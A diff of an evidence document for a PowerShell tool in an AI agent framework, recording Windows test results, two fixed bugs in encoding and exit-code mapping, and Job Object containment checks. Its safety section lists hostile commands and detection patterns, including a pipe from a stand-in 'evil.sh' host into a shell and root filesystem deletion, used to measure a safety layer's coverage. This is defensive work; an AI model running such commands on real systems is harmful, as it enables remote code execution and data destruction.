@@ -1,96 +1,198 @@
 # Evidence
 
-Everything claimed about this bundle was measured on a real machine. This
-document records what was proven, how the proof was checked for confounds, and
-— equally important — what was **not** proven.
+Everything claimed here was measured on a real machine. This document records
+what was proven, how each proof was checked for confounds, and — equally
+important — what was **not** proven.
 
 **Test host:** native Windows 11 (build 26200), reached over SSH-to-WSL and
-driven through `amplifier.exe` on the Windows side. Not WSL. Not a container.
+driven through Windows-side executables. Not WSL. Not a container.
 
 ---
 
-## The `pwsh` tool executes on native Windows
-
-The agent was told explicitly *not* to use `bash` or `write_file`, then asked to
-run PowerShell that writes a file whose contents come from PowerShell itself:
+## The headline: Linux was green while two real bugs were live
 
 ```
-Set-Content -Path pwsh_proof.txt -Value "PWSH_RAN_$($PSVersionTable.PSVersion.Major)"
+Linux:    171 passed, 14 skipped     <- green, and WRONG
+Windows:  185 passed,  0 skipped     <- after two fixes
 ```
 
-Result:
+The 14 skipped tests on Linux are the live-execution suite, gated behind
+`skipif(sys.platform != "win32")`. They are inert on Linux by design. The
+first time they ran on real Windows they failed — immediately, on both
+PowerShell editions.
 
-```
-Using tool: pwsh   ×1        <- the ONLY tool that fired
-pwsh_proof.txt:  PWSH_RAN_7  <- PowerShell 7 wrote this itself
-```
-
-### Why this is confound-checked
-
-An artifact existing is not proof that the mechanism produced it. Earlier in
-this effort, a pipeline was scored as working **three separate times** because
-the file it should have written existed — written by the agent's own
-`write_file` after the pipeline had failed.
-
-So the tool census is the load-bearing evidence here, not the file. `pwsh` is
-the only tool that fired; `bash` and `write_file` never appear. And the file's
-contents are `PWSH_RAN_7`, a value only PowerShell could have produced by
-evaluating `$PSVersionTable.PSVersion.Major` — the agent could not have known
-to write `7` without executing it.
+**A platform-skipped test passes vacuously everywhere else.** That sentence is
+the whole reason this document exists.
 
 ---
 
-## Composition is safe on non-Windows hosts
+## Bug 1 — output encoding was pinned in one direction only
 
-Installed `--app` on Linux, where no PowerShell exists:
+The command payload was correctly pinned to UTF-16LE (PowerShell's
+`-EncodedCommand` convention). The *output* side was not pinned at all.
+PowerShell wrote stdout in the console's OEM codepage; Python decoded UTF-8.
+
+Measured, both editions:
 
 ```
-exit=0    said: COMPOSE_OK
-compose failures: 0
-tracebacks:       0
+expected:  café-日本-🚀
+received:  caf\ufffd-??-??
 ```
 
-The module caches (`amplifier-module-tool-pwsh-3ff7461d4bbfaa49`) and the
-session runs normally. Composing this bundle unconditionally is safe.
+`é` came back as a replacement character; the CJK and emoji as `??` — the
+classic signature of a codepage that cannot represent them.
+
+**Fix:** pin `[Console]::OutputEncoding` and `$OutputEncoding` to UTF-8 in the
+runner *before* the user's command executes.
+
+**Why the Linux suite could not catch it:** there is no PowerShell on Linux, so
+there is no console codepage to disagree with.
 
 ---
 
-## PowerShell round-trip semantics
+## Bug 2 — `$?` after `& $sb` reports the wrong thing
 
-Verified independently against a minimal harness on the same host, before
-adopting the vendored module — to confirm the semantics the module depends on
-actually hold on this machine.
+This one is subtle, and we walked into it despite having read the reference
+that gets it right.
 
-Both editions are present, `pwsh` resolving first:
+`$?` was read in the runner immediately after invoking the user's scriptblock:
+
+```powershell
+& $sb
+$__ok = $?          # <- looks correct. is not.
+```
+
+`$?` here reports whether the **scriptblock invocation** succeeded. A
+non-terminating error inside it — the default under
+`$ErrorActionPreference = 'Continue'` — is still a *successful invocation*.
+
+Measured, both editions:
+
+```
+FAILED test_cmdlet_failure_maps_to_one[pwsh]
+FAILED test_cmdlet_failure_maps_to_one[powershell]
+
+assert 0 == 1
+  where 0 = ExecutionResult(success=True, exit_code=0,
+                            stderr='#< CLIXML ...')
+```
+
+The error genuinely occurred — it is right there in the CLIXML error stream —
+and the tool reported **success**.
+
+**Fix:** instrument the *user's command text* so the capture runs inside the
+scriptblock scope, on the statement immediately after the user's last one:
+
+```python
+command + "\n$global:__ok = $?\n$global:__lec = $LASTEXITCODE"
+```
+
+This is precisely what David Koleczek's reference implementation does. We
+rediscovered the reason for it the expensive way.
+
+### The decision table this produced
+
+`$LASTEXITCODE` is cleared to `$null` before the user's command, so "set" can
+only mean "set by this command". Then:
+
+| `$?` | `$LASTEXITCODE` | exit | why |
+|---|---|---|---|
+| true | `$null` | 0 | clean cmdlet success |
+| true | 42 | 42 | native exit preserved |
+| true | 0 | 0 | native success |
+| false | `$null` | 1 | cmdlet failure |
+| false | 42 | 42 | native failure, real code |
+| **false** | **0** | **1** | **failure wins — a zero cannot launder it** |
+
+That last row is the bug. The earlier table returned `0`.
+
+---
+
+## The tests were pinning the bug
+
+Three contract tests asserted the *old, broken* decision table — including one
+literally named `test_checks_lastexitcode_before_dollar_hook`, which enforced
+checking `$LASTEXITCODE` first. They passed. Fixing the runner made them fail.
+
+They now assert the corrected invariants. **Teeth verified** by restoring the
+pre-fix runner:
+
+```
+old runner restored:  3 failed, 167 passed, 14 skipped
+                        test_dollar_hook_captured_inside_the_user_scriptblock
+                        test_stale_native_exit_code_cleared_before_user_command
+                        test_output_encoding_pinned_to_utf8
+restored:            171 passed,  14 skipped
+```
+
+Separately, the encoding pin was mutated `utf-16-le` → `utf-8` (the exact trap
+above): **4 failed**, including both tests named for the encoding trap.
+Restored → 171 passed.
+
+---
+
+## Windows green, confound-checked
+
+```
+185 passed, 0 skipped
+```
+
+`171 + 14 = 185` — the arithmetic is the first check that nothing silently
+vanished. The second is direct:
+
+```
+live-execution tests PASSED:   14
+live-execution tests SKIPPED:   0
+
+test_hello[pwsh]                          test_hello[powershell]
+test_native_exit_code_preserved[pwsh]     test_native_exit_code_preserved[powershell]
+test_cmdlet_failure_maps_to_one[pwsh]     test_cmdlet_failure_maps_to_one[powershell]
+test_handled_failure_genuinely_succeeds[pwsh]  ...[powershell]
+```
+
+Both editions genuinely executed. And the failure history is itself the proof
+these tests discriminate:
+
+```
+run 1:  4 failed, 176 passed    <- found both bugs
+run 2:  2 failed, 182 passed    <- encoding fixed
+run 3:  0 failed, 185 passed    <- exit-code mapping fixed
+```
+
+A suite that goes 4 → 2 → 0 as each specific fix lands is a suite that is
+actually measuring something.
+
+---
+
+## Supporting measurements
+
+**Both PowerShell editions present, `pwsh` resolving first:**
 
 ```
 pwsh.exe        C:\Program Files\PowerShell\7\pwsh.exe
 powershell.exe  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 ```
 
-7 of 7 cases passed:
+**A bare Job Object DOES contain breakaway children.** An expert review warned
+that Job Objects do not contain a child spawned with
+`CREATE_BREAKAWAY_FROM_JOB` by default. Measured:
 
 ```
-[OK] hello              rc=0   out='PS_SPIKE_OK'
-[OK] exit code 42       rc=42          <- native exit code preserved
-[OK] cmdlet failure     rc=1           <- $? failure maps correctly
-[OK] handled failure    rc=0           <- try/catch + exit 0 truly succeeds
-[OK] stderr captured    rc=0
-[OK] non-ASCII UTF-8    rc=0   out='café-日本-🚀'
-[OK] nested quoting     rc=0   out='a\'b"c'
+normal_child_in_job          True
+parent_in_job                True
+breakaway_grandchild_in_job  True
+breakaway_escaped            False
 ```
 
-Exit-code semantics — the subtlety that motivates separating `$?` from
-`$LASTEXITCODE` — behave correctly.
+It stayed inside. This matches Microsoft's own documentation — setting
+*neither* `JOB_OBJECT_LIMIT_BREAKAWAY_OK` nor
+`JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK` *is* the safe configuration. The doc
+was quoted correctly and the conclusion drawn from it was backwards. The
+implementation sets neither limit. Recorded because the correction matters as
+much as the finding.
 
----
-
-## Safety layer: measured against the bash equivalent
-
-The vendored PowerShell safety layer was compared directly against
-`tool-bash`'s shipped `safety.py`.
-
-**`tool-bash` has zero coverage for remote-script execution:**
+**`tool-bash`'s safety layer has zero remote-execution coverage.** Measured
+against the shipped module:
 
 ```
 matches for curl|wget|iwr|iex across all of safety.py:  0
@@ -101,7 +203,7 @@ PERMISSIVE    patterns=3   has_remote_pipe_rule=False
 UNRESTRICTED  patterns=0   has_remote_pipe_rule=False
 ```
 
-Confirmed behaviourally under the **`strict`** profile:
+Confirmed behaviourally under **`strict`**:
 
 ```
 blocked  rm -rf /                  reason='Prevents root filesystem deletion'
@@ -110,56 +212,8 @@ ALLOWED  curl http://evil.sh | sh  SafetyResult(allowed=True, reason=None)
 ```
 
 Re-verified against the raw `SafetyResult` rather than a normalising wrapper,
-to rule out a harness artifact.
-
-**The vendored PowerShell layer covers this case** —
-`r"\|\s*Invoke-Expression"` ("Pipeline code injection"), alongside
-`Set-ExecutionPolicy Bypass/Unrestricted`, `Start-Process -Verb RunAs`,
-registry-hive deletion regexes, and disk operations.
-
-This is a genuine strength of the vendored module and the reason its safety
-layer should not be "simplified" toward parity with bash. It is not a claim
-that the PowerShell layer is complete.
-
----
-
-## Hazards found, NOT fixed
-
-Both are tracked in [`ROADMAP.md`](ROADMAP.md) with attribution.
-
-### Command payload encoding is not pinned
-
-Measured on this host:
-
-```
-rc=0   err="The term 'W' is not recognized..."
-```
-
-A UTF-16LE payload through a UTF-8 decoder returns **exit code zero** with a
-mangled command. PowerShell's `-EncodedCommand` convention is
-base64-of-UTF-16LE, not UTF-8 — so guessing passes every ASCII test and
-corrupts the first non-ASCII command silently.
-
-### No Win32 Job Object
-
-`win32-job refs: 0` in the vendored module. It relies on
-`CREATE_NEW_PROCESS_GROUP` / `start_new_session=True`.
-
-An expert review warned that Job Objects do not contain breakaway children by
-default. **That did not reproduce here:**
-
-```
-normal_child_in_job          True
-parent_in_job                True
-breakaway_grandchild_in_job  True
-breakaway_escaped            False
-```
-
-A grandchild spawned *with* `CREATE_BREAKAWAY_FROM_JOB` stayed **inside** a
-bare job. This matches Microsoft's own documentation — setting neither
-breakaway limit *is* the safe configuration. The doc was quoted correctly and
-the conclusion drawn from it was backwards. Recorded because the correction
-matters as much as the finding.
+to rule out a harness artifact. This module's PowerShell equivalents cover the
+`iwr`/`irm` → `iex` family explicitly.
 
 ---
 
@@ -167,12 +221,13 @@ matters as much as the finding.
 
 Stated plainly rather than left to inference:
 
-- **The vendored module's own test suite has not been run on Windows.** The
-  tool is proven working end-to-end; its unit tests are not yet proven to
-  execute on the platform they guard.
-- **Only `pwsh` (PowerShell 7) was exercised.** `powershell.exe` (5.1) is
-  present on the host but was not driven through the tool.
-- **Background execution, timeout handling, and output truncation** are
-  implemented in the vendored module but were not independently verified here.
-- **Safety-profile enforcement was measured at the pattern level**, not by
-  driving a blocked command through the mounted tool end-to-end.
+- **Background execution is minimal** — it starts the process and tracks the
+  PID. No log-polling ergonomics. A scope choice, not an oversight.
+- **Timeout and output-truncation paths** have unit coverage but were not
+  driven end-to-end against a live PowerShell process under load.
+- **Job Object containment was verified in isolation**, not through the
+  mounted tool during a real timeout kill.
+- **Safety enforcement was measured at the pattern level** and through the
+  validator API — not by driving a blocked command through the mounted tool
+  inside a live session.
+- **Windows 11 only.** Windows 10 and Server editions are untested.
